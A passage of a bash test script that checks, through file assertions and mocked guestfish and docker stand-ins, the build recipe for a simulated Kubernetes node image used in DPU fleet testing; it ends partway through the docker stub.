#!/usr/bin/env bash

# Copyright 2026 NVIDIA.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

set -euo pipefail

# Static and mocked checks for the simfleet-node recipe. Everything here runs
# on any POSIX host with bash and coreutils; the real build needs Linux amd64
# and libguestfs.

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "${TMP}"' EXIT

fail() {
	echo "FAIL: $*" >&2
	exit 1
}

assert_contains() {
	local needle="$1"
	local file="$2"
	grep -Fq -- "${needle}" "${file}" || fail "${file} does not contain: ${needle}"
}

assert_matches() {
	local pattern="$1"
	local file="$2"
	grep -Eq -- "${pattern}" "${file}" || fail "${file} does not match: ${pattern}"
}

assert_not_matches() {
	local pattern="$1"
	local file="$2"
	if grep -Eq -- "${pattern}" "${file}"; then
		fail "${file} unexpectedly matches: ${pattern}"
	fi
}

assert_absent() {
	local needle="$1"
	local file="$2"
	if grep -Fq -- "${needle}" "${file}"; then
		fail "${file} unexpectedly contains: ${needle}"
	fi
}

# assert_secret_read_once fails unless the join Secret was fetched exactly
# once. Provenance and payload have to come from the same response: two reads
# leave a window in which the Secret that was vouched for is not the Secret
# that is executed.
assert_secret_read_once() {
	local file="$1" reads
	reads="$(grep -c 'get secret ' "${file}" || true)"
	if [ "${reads}" != "1" ]; then
		fail "${file} reads the join Secret ${reads} times; expected exactly 1"
	fi
}

# test_container_image_contract pins the node-in-a-pod image's recipe. It reads
# files only, so it needs neither Docker nor a built image.
test_container_image_contract() {
	local file dockerfile="${ROOT}/Dockerfile.container"
	for file in Dockerfile.container verify-container.sh \
		guest/container-entrypoint.sh guest/kubeadm-join.args \
		"guest/kubeadm-patches/kubeletconfiguration+strategic.yaml"; do
		test -f "${ROOT}/${file}" || fail "missing ${file}"
	done
	for file in verify-container.sh guest/container-entrypoint.sh; do
		test -x "${ROOT}/${file}" || fail "${file} is not executable"
		bash -n "${ROOT}/${file}" || fail "${file} does not parse"
	done

	# The join args file is one line, one argument, and nothing that waves
	# preflight errors through.
	local args="${ROOT}/guest/kubeadm-join.args"
	[ "$(cat "${args}")" = '--patches=/usr/lib/dpf-sim/kubeadm-patches' ] \
		|| fail "guest/kubeadm-join.args must hold exactly --patches=/usr/lib/dpf-sim/kubeadm-patches"
	[ "$(wc -l < "${args}" | tr -d ' ')" = 1 ] || fail "guest/kubeadm-join.args must be one line"
	assert_absent 'ignore-preflight-errors' "${args}"

	# The kubelet patch overrides exactly what the container needs.
	local patch="${ROOT}/guest/kubeadm-patches/kubeletconfiguration+strategic.yaml"
	assert_matches '^apiVersion: kubelet\.config\.k8s\.io/v1beta1$' "${patch}"
	assert_matches '^kind: KubeletConfiguration$' "${patch}"
	assert_matches '^cgroupRoot: /$' "${patch}"
	assert_matches '^failSwapOn: false$' "${patch}"
	assert_matches '^evictionHard:$' "${patch}"
	assert_matches '^  nodefs\.available: "0%"$' "${patch}"
	assert_matches '^  nodefs\.inodesFree: "0%"$' "${patch}"
	assert_matches '^  imagefs\.available: "0%"$' "${patch}"

	# Dockerfile directives.
	assert_matches '^FROM ubuntu:24\.04$' "${dockerfile}"
	assert_matches '^ENV container=oci( |\\|$)' "${dockerfile}"
	assert_matches '^STOPSIGNAL SIGRTMIN\+3$' "${dockerfile}"
	assert_matches '^ENTRYPOINT \["/usr/local/bin/container-entrypoint\.sh"\]$' "${dockerfile}"
	assert_matches '^ARG KUBE_APT_VERSION$' "${dockerfile}"
	# lib.sh stays the only Kubernetes pin.
	assert_absent '1.36' "${dockerfile}"
	assert_contains 'KUBE_APT_VERSION="${KUBE_APT_VERSION}" /tmp/install.sh' "${dockerfile}"
	assert_matches 'systemd( |$)' "${dockerfile}"
	assert_matches '[[:space:]]kmod( |$)' "${dockerfile}"
	assert_matches '[[:space:]]procps( |$)' "${dockerfile}"
	assert_not_matches '^[^#]*qemu-guest-agent' "${dockerfile}"
	assert_absent 'modules-load.d/simfleet.conf' "${dockerfile}"
	# The same two units, binary and helper, at the same paths as the VM disk.
	assert_contains 'guest/mock-dpuagent.service guest/wait-kubelet-join.service /usr/lib/systemd/system/' "${dockerfile}"
	assert_contains '/opt/dpf/mock-dpuagent' "${dockerfile}"
	assert_contains 'guest/wait-kubelet-join.sh /opt/dpf/wait-kubelet-join.sh' "${dockerfile}"
	assert_contains 'systemctl enable mock-dpuagent.service wait-kubelet-join.service' "${dockerfile}"
	# A container has no cloud-init.target, so both units move to multi-user.target.
	assert_contains "sed -i 's/^WantedBy=cloud-init.target\$/WantedBy=multi-user.target/'" "${dockerfile}"
	assert_contains 'guest/10-flannel.conflist /etc/cni/net.d/10-flannel.conflist' "${dockerfile}"
	assert_contains 'guest/kubeadm-join.args /usr/lib/dpf-sim/kubeadm-join.args' "${dockerfile}"
	assert_contains 'guest/kubeadm-patches/ /usr/lib/dpf-sim/kubeadm-patches/' "${dockerfile}"
	# Outside comments, nothing may be put under /etc/dpf-sim: the guest Secret
	# is mounted over it.
	assert_not_matches '^[^#]*/etc/dpf-sim' "${dockerfile}"
	local unit
	for unit in systemd-modules-load.service systemd-resolved.service \
		systemd-udevd.service 'getty@.service' systemd-remount-fs.service; do
		assert_contains "${unit}" "${dockerfile}"
	done
	assert_contains 'systemctl mask' "${dockerfile}"
	assert_matches 'guest/container-entrypoint\.sh /usr/local/bin/container-entrypoint\.sh' "${dockerfile}"

	# The entrypoint.
	local entrypoint="${ROOT}/guest/container-entrypoint.sh"
	assert_contains 'exec unshare --cgroup' "${entrypoint}"
	assert_contains 'umount /sys/fs/cgroup' "${entrypoint}"
	assert_contains 'mount -t cgroup2' "${entrypoint}"
	assert_contains '"0::/"' "${entrypoint}"
	assert_contains '/proc/self/cgroup' "${entrypoint}"
	assert_contains 'mount --make-rshared /' "${entrypoint}"
	assert_contains '/sys/fs/cgroup/init.scope' "${entrypoint}"
	assert_contains '/sys/fs/cgroup/cgroup.subtree_control' "${entrypoint}"
	assert_contains ': > /etc/machine-id' "${entrypoint}"
	assert_contains '/dev/kmsg' "${entrypoint}"
	assert_matches '^exec /sbin/init$' "${entrypoint}"
	assert_contains 'kind' "${entrypoint}"
	# The cgroup check must come before anything touches the hierarchy, and
	# init must be the last thing the script does.
	local check_line move_line init_line
	check_line="$(grep -n '"0::/"' "${entrypoint}" | head -1 | cut -d: -f1)"
	move_line="$(grep -n 'init.scope/cgroup.procs' "${entrypoint}" | head -1 | cut -d: -f1)"
	init_line="$(grep -n '^exec /sbin/init$' "${entrypoint}" | cut -d: -f1)"
	[ "${check_line}" -lt "${move_line}" ] || fail "the entrypoint moves processes before checking its cgroup root"
	[ "${move_line}" -lt "${init_line}" ] || fail "the entrypoint must exec /sbin/init last"
	[ "${init_line}" = "$(grep -c '' "${entrypoint}")" ] || fail "nothing may follow exec /sbin/init"
	assert_contains 'kind' "${ROOT}/../../THIRD_PARTY_NOTICES.md"
	assert_contains 'images/simfleet-node/guest/container-entrypoint.sh' "${ROOT}/../../THIRD_PARTY_NOTICES.md"

	# The Makefile target.
	assert_contains 'node-container-image-build:' "${ROOT}/Makefile"
	assert_contains 'NODE_CONTAINER_IMG ?= simfleet-node-container:local' "${ROOT}/Makefile"
	assert_contains '--platform linux/amd64' "${ROOT}/Makefile"
	assert_contains '-f Dockerfile.container' "${ROOT}/Makefile"
	assert_contains '--build-arg KUBE_APT_VERSION="$(KUBE_APT_VERSION)"' "${ROOT}/Makefile"
	assert_contains 'SIMFLEET_KUBE_APT_VERSION' "${ROOT}/Makefile"
	assert_absent '1.36' "${ROOT}/Makefile"
	assert_contains 'DPUAGENT_BIN' "${ROOT}/Makefile"
	if command -v make > /dev/null 2>&1; then
		make -s -n -C "${ROOT}" node-container-image-build DPUAGENT_BIN="${TMP}/mock" > "${TMP}/container-make.out" 2>&1 \
			|| fail "make -n node-container-image-build failed"
		assert_contains 'KUBE_APT_VERSION="1.36.4-1.1"' "${TMP}/container-make.out"
		assert_contains "--build-context dpuagent=\"${TMP}/\"" "${TMP}/container-make.out"
	fi

	# The VM disk must not carry anything that only the container uses: the VM
	# image ships no join-args file, kubelet patch or entrypoint.
	for file in kubeadm-join.args kubeadm-patches container-entrypoint.sh \
		/usr/lib/dpf-sim; do
		assert_absent "${file}" "${ROOT}/customize-disk.sh"
		assert_absent "${file}" "${ROOT}/Dockerfile"
	done
	assert_absent 'Dockerfile.container' "${ROOT}/customize-disk.sh"

	# The verifier checks what the brief promises.
	local verifier="${ROOT}/verify-container.sh"
	assert_contains 'run -d --privileged' "${verifier}"
	assert_contains 'running | degraded' "${verifier}"
	assert_contains 'is-enabled kubelet.service' "${verifier}"
	assert_contains 'mock-dpuagent.service' "${verifier}"
	assert_contains 'wait-kubelet-join.service' "${verifier}"
	assert_contains 'dpkg-query -W -f=' "${verifier}"
	assert_contains 'SIMFLEET_KUBE_APT_VERSION' "${verifier}"
}

test_recipe_contract() {
	local file
	for file in Makefile build.sh build-cached.sh check-host.sh lib.sh \
		source-hash.sh Dockerfile Dockerfile.builder customize-disk.sh \
		verify-guest.sh README.md \
		guest/install.sh guest/mock-dpuagent.service guest/wait-kubelet-join.sh \
		guest/wait-kubelet-join.service guest/10-flannel.conflist; do
		test -f "${ROOT}/${file}" || fail "missing ${file}"
	done
	for file in build.sh build-cached.sh check-host.sh customize-disk.sh \
		source-hash.sh verify-guest.sh guest/install.sh test.sh \
		guest/wait-kubelet-join.sh; do
		test -x "${ROOT}/${file}" || fail "${file} is not executable"
	done

	assert_contains 'BASE_DIGEST ?= sha256:f3824dc850e0655eae3a6f744ec71a38b216da163636e1d0a724715316515555' "${ROOT}/Makefile"
	assert_contains 'NODE_IMG ?= simfleet-node:local' "${ROOT}/Makefile"
	assert_contains "--label \"\${SIMFLEET_KUBERNETES_VERSION_LABEL}=\${kube_version}\"" \
		"${ROOT}/build.sh"
	assert_contains 'SIMFLEET_OCI_VERSION_LABEL' "${ROOT}/build.sh"
	assert_contains 'org.opencontainers.image.version' "${ROOT}/lib.sh"
	if grep -Eq '^KUBE_VERSION[[:space:]]*[?:+]?=' "${ROOT}/Makefile"; then
		fail "Makefile must not expose KUBE_VERSION independently of guest contents"
	fi
	# lib.sh is the one pin; install.sh must fail rather than fall back to its own.
	assert_contains 'KUBE_APT_VERSION="${KUBE_APT_VERSION:?' "${ROOT}/guest/install.sh"
	assert_absent '1.36' "${ROOT}/guest/install.sh"
	assert_contains 'pkgs.k8s.io/core:/stable:/${KUBE_MINOR}/deb/' "${ROOT}/guest/install.sh"
	assert_contains 'SIMFLEET_KUBE_APT_VERSION="1.36.4-1.1"' "${ROOT}/lib.sh"
	test ! -e "${ROOT}/guest/10-simfleet-bridge.conf" \
		|| fail "the fixed host-local CNI configuration must not ship"
	assert_absent '10-simfleet-bridge.conf' "${ROOT}/customize-disk.sh"
	assert_absent '/etc/cni/net.d/10-simfleet-bridge.conf' "${ROOT}/verify-guest.sh"
	# DPF's Flannel DPUService copies /opt/cni/bin/flannel but not the conflist,
	# so kubelet stays NetworkPluginNotReady. The image ships kube-flannel's
	# default conflist; it must not ship a host-local bridge config.
	test -f "${ROOT}/guest/10-flannel.conflist" \
		|| fail "missing guest/10-flannel.conflist"
	assert_contains '"type": "flannel"' "${ROOT}/guest/10-flannel.conflist"
	assert_contains '10-flannel.conflist:/etc/cni/net.d' "${ROOT}/customize-disk.sh"
	assert_contains '/etc/cni/net.d/10-flannel.conflist' "${ROOT}/verify-guest.sh"

	# The guest has to be ready for kubeadm join, not merely have the binaries.
	assert_contains 'containerd config default > /etc/containerd/config.toml' "${ROOT}/guest/install.sh"
	assert_contains 'SystemdCgroup = true' "${ROOT}/guest/install.sh"
	assert_contains '/etc/sysctl.d/99-simfleet-k8s.conf' "${ROOT}/guest/install.sh"
	assert_contains 'systemctl enable containerd' "${ROOT}/guest/install.sh"
	# VM-only steps live in customize-disk.sh, not the shared guest/install.sh.
	assert_contains '/etc/modules-load.d/simfleet.conf' "${ROOT}/customize-disk.sh"
	assert_absent '/etc/modules-load.d/simfleet.conf' "${ROOT}/guest/install.sh"
	assert_absent 'systemctl enable qemu-guest-agent.service' "${ROOT}/customize-disk.sh"
	assert_absent 'systemctl enable qemu-guest-agent.service' "${ROOT}/guest/install.sh"
	assert_contains $'\tqemu-guest-agent' "${ROOT}/customize-disk.sh"
	assert_absent 'qemu-guest-agent' "${ROOT}/guest/install.sh"
	# apt in the guest has no DNS under virt-customize unless customize-disk.sh
	# provides one, and the build-time resolver must not ship in the image.
	assert_contains 'printf '"'"'nameserver 169.254.2.3\n'"'"' > /etc/resolv.conf' \
		"${ROOT}/customize-disk.sh"
	assert_contains 'trap restore_resolv EXIT' "${ROOT}/customize-disk.sh"
	assert_absent '169.254.2.3' "${ROOT}/guest/install.sh"
	assert_absent 'restore_resolv' "${ROOT}/guest/install.sh"
	assert_contains 'apt-get clean' "${ROOT}/guest/install.sh"
	assert_contains 'rm -rf /var/lib/apt/lists' "${ROOT}/guest/install.sh"
	assert_contains 'apt-get install -y --no-install-recommends \' "${ROOT}/guest/install.sh"
	assert_contains 'containerd must be installed before guest/install.sh' "${ROOT}/guest/install.sh"
	assert_absent $'\tcontainerd' "${ROOT}/guest/install.sh"
	# The same Ubuntu package, installed by each image. The VM build blocks
	# service starts because virt-customize has no systemd.
	assert_contains 'apt-get install -y --no-install-recommends containerd' "${ROOT}/customize-disk.sh"
	assert_contains 'printf '"'"'#!/bin/sh\nexit 101\n'"'"' > /usr/sbin/policy-rc.d' \
		"${ROOT}/customize-disk.sh"
	assert_contains 'rm -f /usr/sbin/policy-rc.d' "${ROOT}/customize-disk.sh"
	assert_absent 'policy-rc.d' "${ROOT}/guest/install.sh"
	assert_contains 'containerd \' "${ROOT}/Dockerfile.container"
	assert_absent 'policy-rc.d' "${ROOT}/Dockerfile.container"
	for file in guest/install.sh customize-disk.sh Dockerfile.container; do
		if grep -Fq 'containerd.io' "${ROOT}/${file}"; then
			fail "${file} must use Ubuntu's containerd package only"
		fi
	done
	if grep -Fq '| head' "${ROOT}/guest/install.sh"; then
		fail "guest version checks must not risk pipefail from an early-closing pipe"
	fi

	# The cloud image numbers partitions 1,14,15,16 out of physical order.
	# Growth must preserve those numbers or GRUB enters rescue mode.
	assert_contains 'part-expand-gpt ${root_disk}' "${ROOT}/customize-disk.sh"
	assert_contains 'part-resize ${root_disk} ${root_partition}' "${ROOT}/customize-disk.sh"
	assert_contains 'resize2fs ${root_device}' "${ROOT}/customize-disk.sh"
	assert_contains 'grown_root_device="$(simfleet_root_device "${OUT_IMG}")"' \
		"${ROOT}/customize-disk.sh"
	assert_absent 'virt-resize --expand' "${ROOT}/customize-disk.sh"
	assert_contains 'virt-sparsify --in-place' "${ROOT}/customize-disk.sh"
	assert_absent 'growpart' "${ROOT}/customize-disk.sh"
	assert_absent "--run-command 'true'" "${ROOT}/customize-disk.sh"

	# The host cannot run libguestfs on the CI runners, so the disk stages must
	# stay inside the builder image and build.sh must not reach for them.
	local host_tool
	for host_tool in virt-resize virt-customize virt-sysprep virt-sparsify guestfish; do
		assert_absent "${host_tool} " "${ROOT}/build.sh"
	done
	assert_contains 'libguestfs-make-fixed-appliance' "${ROOT}/Dockerfile.builder"
	assert_contains 'isc-dhcp-client' "${ROOT}/Dockerfile.builder"
	assert_contains 'guestfish --network' "${ROOT}/Dockerfile.builder"
	assert_contains 'APPLIANCE_NETWORK_OK' "${ROOT}/Dockerfile.builder"

	local path
	for path in /opt/cni/bin/bridge /opt/cni/bin/host-local /opt/cni/bin/loopback \
		/etc/cni/net.d/10-flannel.conflist \
		/etc/containerd/config.toml /etc/modules-load.d/simfleet.conf \
		/etc/sysctl.d/99-simfleet-k8s.conf; do
		assert_matches $'^\t'"${path}\$" "${ROOT}/verify-guest.sh"
	done
	# /lib is a compatibility symlink on Ubuntu 24.04; assert the real path.
	assert_contains '/usr/lib/systemd/system/containerd.service' "${ROOT}/verify-guest.sh"
	assert_absent ' /lib/systemd/system/containerd.service' "${ROOT}/verify-guest.sh"
	assert_contains 'COPY --chown=107:107 disk.img /disk/disk.img' "${ROOT}/Dockerfile"

	# Cloud-init supplies the mock configuration later. The image ships only the
	# mock binary, its unit, and the join helper used by a later task.
	#
	# Both units are vendor units, under /usr/lib/systemd/system. That is what
	# makes them maskable: systemd's search path is /etc, then /run, then
	# /usr/lib, so a unit file sitting in /etc leaves no higher-priority
	# location for `systemctl mask` to put its /dev/null symlink. Masking is how
	# a fleet with dpuAgent.enabled:false stops these two, so the placement is a
	# contract, not a preference.
	for path in /opt/dpf/mock-dpuagent /opt/dpf/wait-kubelet-join.sh \
		/usr/lib/systemd/system/mock-dpuagent.service \
		/usr/lib/systemd/system/wait-kubelet-join.service; do
		assert_matches $'^\t'"${path}\$" "${ROOT}/verify-guest.sh"
	done
	# Nothing may install either unit into /etc: that is the directory a mask
	# has to own.
	for unit in mock-dpuagent.service wait-kubelet-join.service; do
		assert_absent "/etc/systemd/system/${unit}" "${ROOT}/customize-disk.sh"
		assert_contains "/usr/lib/systemd/system/${unit}" "${ROOT}/verify-guest.sh"
	done
	assert_contains '/usr/lib/systemd/system' "${ROOT}/customize-disk.sh"
	assert_contains 'systemctl enable mock-dpuagent.service' "${ROOT}/customize-disk.sh"
	assert_contains 'systemctl enable wait-kubelet-join.service' "${ROOT}/customize-disk.sh"
	assert_contains 'mock-dpuagent.service is disabled; expected enabled' "${ROOT}/verify-guest.sh"
	assert_contains 'wait-kubelet-join.service is disabled; expected enabled' \
		"${ROOT}/verify-guest.sh"
	# Enabling a vendor unit puts the .wants symlink in /etc, which is correct
	# and does not collide with the mask symlink: one is
	# /etc/systemd/system/cloud-init.target.wants/<unit>, the other is
	# /etc/systemd/system/<unit>. verify-guest.sh checks the former.
	assert_contains '/etc/systemd/system/${target}.wants/${unit}' "${ROOT}/verify-guest.sh"
	# A masked unit stays enabled on disk and systemd simply refuses to start
	# it, so the image must not try to pre-disable either one.
	for unit in mock-dpuagent.service wait-kubelet-join.service; do
		assert_absent "systemctl disable ${unit}" "${ROOT}/customize-disk.sh"
	done
	# The join helper is the one guest script allowed to run kubeadm: it stands
	# in for the DPF agent's Configure Kubelet step. Everything else in the
	# guest, and cloud-init above it, must stay out of the join.
	for file in "${ROOT}"/guest/*.sh; do
		assert_absent '--skip-' "${file}"
		case "${file}" in
		*/wait-kubelet-join.sh) continue ;;
		esac
		assert_absent 'kubeadm join' "${file}"
	done
	# kubeadm starts kubelet as part of the join. The helper must not take that
	# step itself, or it would be racing the mock's Start Kubelet operation.
	assert_absent 'systemctl start kubelet' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_absent 'systemctl stop kubelet' "${ROOT}/guest/wait-kubelet-join.sh"
	# The join value is a credential-bearing command from a Secret. It is
	# validated into an argument vector, never handed to a shell.
	assert_absent 'eval ' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_absent 'bash -c' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_contains 'validate_join_command' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_contains '--node-name=' "${ROOT}/guest/wait-kubelet-join.sh"
	# The controller stopped reading the join Secret, so provenance has to be
	# re-established here against the DPU's own UID. Owner reference values are
	# never compared as text: the API server compares the real field values and
	# the guest only reads its verdict.
	assert_contains 'ownerReferences' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_contains 'go-template' "${ROOT}/guest/wait-kubelet-join.sh"
	assert_absent '{.metadata.ownerReferences' "${ROOT}/guest/wait-kubelet-join.sh"

	assert_contains 'ExecStart=/opt/dpf/wait-kubelet-join.sh' \
		"${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'ConditionPathExists=/etc/dpf-sim/mgmt.kubeconfig' \
		"${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'Type=oneshot' "${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'Restart=on-failure' "${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'StartLimitIntervalSec=0' "${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'WantedBy=cloud-init.target' "${ROOT}/guest/wait-kubelet-join.service"
	assert_absent 'WantedBy=multi-user.target' "${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'StandardOutput=journal+console' "${ROOT}/guest/wait-kubelet-join.service"
	# Redfish on 443 has to answer before DPF can create the DPU that produces
	# the join Secret, so no ordering may exist between the two units in either
	# direction. Comments naming the other unit are fine; directives are not.
	assert_not_matches '^(After|Before|Requires|Requisite|Wants|BindsTo)=.*wait-kubelet-join' \
		"${ROOT}/guest/mock-dpuagent.service"
	assert_not_matches '^(After|Before|Requires|Requisite|Wants|BindsTo)=.*mock-dpuagent' \
		"${ROOT}/guest/wait-kubelet-join.service"
	assert_contains 'ExecStartPre=/usr/bin/test -s /etc/mock-dpuagent/config.yaml' \
		"${ROOT}/guest/mock-dpuagent.service"
	assert_contains 'ConditionPathExists=/etc/mock-dpuagent/config.yaml' \
		"${ROOT}/guest/mock-dpuagent.service"
	assert_contains 'ExecStart=/opt/dpf/mock-dpuagent --config=/etc/mock-dpuagent/config.yaml' \
		"${ROOT}/guest/mock-dpuagent.service"
	assert_contains 'After=network-online.target cloud-final.service' \
		"${ROOT}/guest/mock-dpuagent.service"
	# multi-user.target is reached before cloud-final.service starts, so a unit
	# wanted by it and ordered after cloud-final never runs.
	assert_contains 'WantedBy=cloud-init.target' "${ROOT}/guest/mock-dpuagent.service"
	assert_absent 'WantedBy=multi-user.target' "${ROOT}/guest/mock-dpuagent.service"
	# A guest that exhausts the start limit looks exactly like one that never
	# received credentials, so the unit must keep retrying.
	assert_contains 'StartLimitIntervalSec=0' "${ROOT}/guest/mock-dpuagent.service"
	# The serial console is the only guest log the e2e suite can read.
	assert_contains 'StandardOutput=journal+console' "${ROOT}/guest/mock-dpuagent.service"
	assert_contains 'StandardError=journal+console' "${ROOT}/guest/mock-dpuagent.service"
}

# write_dpuagent_bin stands in for the linux/amd64 mock agent that
# hack/dpuagent/build.sh produces. Its bytes land in the source hash, so the
# content is fixed unless a case deliberately changes it.
write_dpuagent_bin() {
	local target="${1:-${TMP}/mock-dpuagent}"
	local content="${2:-fake mock-dpuagent}"
	mkdir -p "$(dirname "${target}")"
	printf '%s\n' "${content}" > "${target}"
	chmod +x "${target}"
}

write_fake() {
	local name="$1"
	shift
	mkdir -p "${TMP}/bin"
	{
		printf '#!/usr/bin/env bash\nset -euo pipefail\n'
		printf '%s\n' "$@"
	} > "${TMP}/bin/${name}"
	chmod +x "${TMP}/bin/${name}"
}

# write_guestfish installs a guestfish stand-in that answers every command the
# recipe issues with a healthy guest. Individual cases override one answer
# through the FAKE_* environment variables.
write_guestfish() {
	local target="${1:-${TMP}/bin/guestfish}"
	mkdir -p "$(dirname "${target}")"
	cat > "${target}" << 'EOF'
#!/usr/bin/env bash
set -euo pipefail

disk_args="$*"
if [ -n "${FAKE_GUESTFISH_FAIL_ON:-}" ]; then
  fail_on="${FAKE_GUESTFISH_FAIL_ON}"
else
  fail_on=""
fi

while IFS= read -r request; do
  echo "guestfish request ${request}" >>"${CALLS:-/dev/null}"
  if [ -n "${fail_on}" ] && [ "${request}" = "${fail_on}" ]; then
    echo "libguestfs: error: ${request}" >&2
    exit 1
  fi
  case "${request}" in
    run) ;;
    inspect-os)
      if [[ "${disk_args}" == *"/disk.img"* ]]; then
        printf '%s\n' "${FAKE_GROWN_ROOT_DEVICE:-${FAKE_ROOT_DEVICE:-/dev/sda1}}"
      else
        printf '%s\n' "${FAKE_ROOT_DEVICE:-/dev/sda1}"
      fi
      ;;
    'part-expand-gpt '* | 'part-resize '* | 'resize2fs '*) ;;
    'statvfs /')
      printf 'bsize: 4096\nfrsize: 4096\nblocks: %s\nbfree: 1000000\n' \
        "${FAKE_ROOT_BLOCKS:-2500000}"
      ;;
    'is-file /usr/sbin/qemu-ga') printf '%s\n' "${FAKE_QEMU_GA_SBIN:-true}" ;;
    'is-file /usr/bin/qemu-ga') printf '%s\n' "${FAKE_QEMU_GA_BIN:-false}" ;;
    'is-file /etc/resolv.conf.simfleet-build')
      printf '%s\n' "${FAKE_RESOLV_BACKUP_LEFT:-false}"
      ;;
    'is-symlink /etc/resolv.conf')
      printf '%s\n' "${FAKE_RESOLV_IS_LINK:-true}"
      ;;
    'cat /etc/resolv.conf')
      printf '%s\n' "${FAKE_RESOLV:-nameserver 127.0.0.53}"
      ;;
    is-file*)
      if [ "${request}" = "is-file ${FAKE_MISSING_FILE:-}" ]; then
        echo false
      else
        echo true
      fi
      ;;
    'is-symlink /etc/systemd/system/multi-user.target.wants/kubelet.service')
      printf '%s\n' "${FAKE_KUBELET_ENABLED:-false}"
      ;;
    'is-symlink /etc/systemd/system/multi-user.target.wants/containerd.service')
      printf '%s\n' "${FAKE_CONTAINERD_ENABLED:-true}"
      ;;
    'is-symlink /etc/systemd/system/multi-user.target.wants/mock-dpuagent.service')
      printf '%s\n' "${FAKE_DPUAGENT_ON_MULTI_USER:-false}"
      ;;
    'is-symlink /etc/systemd/system/cloud-init.target.wants/mock-dpuagent.service')
      printf '%s\n' "${FAKE_DPUAGENT_ENABLED:-true}"
      ;;
    'is-symlink /etc/systemd/system/multi-user.target.wants/wait-kubelet-join.service')
      printf '%s\n' "${FAKE_JOIN_HELPER_ON_MULTI_USER:-false}"
      ;;
    'is-symlink /etc/systemd/system/cloud-init.target.wants/wait-kubelet-join.service')
      printf '%s\n' "${FAKE_JOIN_HELPER_ENABLED:-true}"
      ;;
    'cat /usr/lib/udev/rules.d/60-qemu-guest-agent.rules')
      if [ -n "${FAKE_AGENT_RULE+x}" ]; then
        printf '%s\n' "${FAKE_AGENT_RULE}"
      else
        printf '%s\n' \
          'SUBSYSTEM=="virtio-ports", ATTR{name}=="org.qemu.guest_agent.0", \' \
          '  TAG+="systemd", ENV{SYSTEMD_WANTS}="qemu-guest-agent.service"'
      fi
      ;;
    'cat /etc/containerd/config.toml')
      printf '%s\n' "${FAKE_CONTAINERD_CONFIG:-$'disabled_plugins = []\n    [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]\n      SystemdCgroup = true'}"
      ;;
    'cat /etc/modules-load.d/simfleet.conf')
      printf '%s\n' "${FAKE_MODULES:-$'overlay\nbr_netfilter'}"
      ;;
    'cat /etc/sysctl.d/99-simfleet-k8s.conf')
      printf '%s\n' "${FAKE_SYSCTLS:-$'net.bridge.bridge-nf-call-iptables = 1\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.ipv4.ip_forward = 1'}"
      ;;
    'cat /var/lib/dpkg/status')
      version="${FAKE_KUBE_DPKG_VERSION:-1.36.4-1.1}"
      for package in kubelet kubeadm kubectl; do
        printf 'Package: %s\nStatus: install ok installed\nVersion: %s\n\n' \
          "${package}" "${version}"
      done
      ;;
    'ls /var/lib/apt/lists') printf '%s\n' "${FAKE_APT_LISTS:-partial}" ;;
    'ls /var/cache/apt/archives') printf '%s\n' "${FAKE_APT_ARCHIVES:-partial}" ;;
    *)
      echo "unexpected guestfish request: ${request}" >&2
      exit 1
      ;;
  esac
done
EOF
	chmod +x "${target}"
}

write_build_host() {
	mkdir -p "${TMP}/bin"
	# The disk stages run inside the builder image now, so `docker run` is the
	# seam the recipe depends on. Rather than assert that a container was asked
	# for and stop there, this stand-in runs the requested command with the
	# mounts translated back to host paths, so customize-disk.sh and the
	# verifier are still exercised for real against the libguestfs stand-ins.
	write_fake docker '
echo "docker $*" >>"${CALLS:-/dev/null}"
# Cache lookups: FAKE_CACHED_HASH set means an image exists carrying that
# label value; unset means no such image at all.
if [ "${1:-}" = image ] && [ "${2:-}" = inspect ]; then
  if [ -z "${FAKE_CACHED_HASH+x}" ]; then
    echo "Error: No such image" >&2
    exit 1
  fi
  printf "%s\n" "${FAKE_CACHED_HASH}"
  exit 0
fi
case "$1" in
  create) echo test-container ;;
  cp) : >"${3}" ;;
  build)
    shift
    iid_file=""
    while [ "$#" -gt 0 ]; do
      case "$1" in
        --iidfile)
          iid_file="$2"
          shift 2
          ;;
        *) shift ;;
      esac
    done
    if [ -n "${iid_file}" ]; then
      printf "%s\n" "${FAKE_BUILDER_IID-sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}" \
        >"${iid_file}"
      echo "fake docker builder output"
    fi
    ;;
  run)
    shift
    envs=(); work=""; recipe=""; image=""; cmd=()
    while [ "$#" -gt 0 ]; do
      case "$1" in
        --rm) shift ;;
        --platform | --device) shift 2 ;;
        -e)
          envs+=("$2")
          shift 2
          ;;
        -v)
          # HOST:CONTAINER[:ro]
          mount_host="${2%%:*}"
          mount_target="${2#*:}"
          case "${mount_target}" in
            /work*) work="${mount_host}" ;;
            /recipe*) recipe="${mount_host}" ;;
          esac
          shift 2
          ;;
        *)
          image="$1"
          shift
          cmd=("$@")
          break
          ;;
      esac
    done
    test -n "${image}" || { echo "docker run: no image" >&2; exit 2; }
    test -n "${work}" || { echo "docker run: no /work mount" >&2; exit 2; }
    test -n "${recipe}" || { echo "docker run: no /recipe mount" >&2; exit 2; }
    # One left-to-right pass over both mounts. Substituting one mount and then
    # the other would rewrite the host path just put in, and a checkout under
    # /home/runner/work, as on GitHub Actions, contains /work.
    to_host() {
      local rest="$1" out=""
      while [ -n "${rest}" ]; do
        case "${rest}" in
          /recipe*) out+="${recipe}"; rest="${rest#/recipe}" ;;
